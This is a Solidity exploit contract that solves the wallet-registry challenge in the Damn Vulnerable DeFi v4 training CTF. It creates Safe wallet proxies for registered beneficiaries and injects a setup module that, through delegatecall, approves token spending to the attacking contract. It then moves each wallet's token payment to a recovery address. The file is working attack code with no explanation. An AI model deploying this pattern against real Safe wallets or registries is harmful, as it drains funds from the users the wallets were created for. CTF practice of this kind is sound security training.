// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Ownable} from "solady/auth/Ownable.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Safe} from "safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {WalletRegistry} from "./WalletRegistry.sol";


contract Module {
    function approve(address player, IERC20 token, uint256 amount) public {
      token.approve(player, amount);
    }
}


contract Attack {
    IERC20 public immutable token;
    SafeProxyFactory public immutable walletFactory;
    address public immutable registry;
    address public immutable singletonCopy;

    uint256 private constant PAYMENT_AMOUNT = 10e18;

    Module public immutable module;

    constructor(address _token, address _registry, address _singletonCopy, SafeProxyFactory _walletFactory){
        module = new Module();
        walletFactory = _walletFactory;
        token = IERC20(_token);
        registry = _registry;
        singletonCopy = _singletonCopy;
    }
    
    function attack(address[] memory initialBeneficiaries, address player, address recovery) public {
        for(uint256 i=0; i < initialBeneficiaries.length; i++){
            newProxy(initialBeneficiaries[i], recovery);
        }
    }

    function newProxy(address beneficiare, address recovery) internal returns(bytes memory initializer)  {
        address[] memory owners = new address[](1);       
        owners[0] = beneficiare;
        initializer =  abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", 
            owners, 
            1,
            address(module),
            abi.encodeCall(module.approve, (address(this), token, PAYMENT_AMOUNT)),  
            address(0),
            address(0),
            0,
            address(0)
        );
        walletFactory.createProxyWithCallback(
            singletonCopy,
            initializer,
            0,
            IProxyCreationCallback(registry)
        );
        token.transferFrom(WalletRegistry(registry).wallets(beneficiare), recovery, PAYMENT_AMOUNT);
    }
}
